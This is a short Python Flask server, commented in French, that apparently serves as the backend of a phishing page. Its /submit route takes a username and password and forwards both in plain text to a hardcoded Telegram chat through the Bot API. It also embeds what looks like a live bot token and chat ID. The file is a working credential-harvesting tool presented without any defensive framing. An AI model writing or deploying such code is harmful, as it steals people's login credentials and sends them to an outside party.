from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Remplacez TOKEN et CHAT_ID par vos informations Telegram
BOT_TOKEN = "7130866739:AAHzCDivxW7B6znphCcxAuw3k6oJkbpx9YI"
CHAT_ID = "6994578596"

@app.route('/submit', methods=['POST'])
def submit_data():
  data = request.get_json()
  username = data.get('username')
  password = data.get('password')

  message = f"Nouveau formulaire soumis :\nUtilisateur : {username}\nMot de passe : {password}"
  send_telegram_message(message)

  return jsonify({"message": "Données reçues avec succès"}), 200

def send_telegram_message(message):
  url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
  data = {"chat_id": CHAT_ID, "text": message}
  requests.post(url, json=data)

if __name__ == "__main__":
  app.run(debug=True)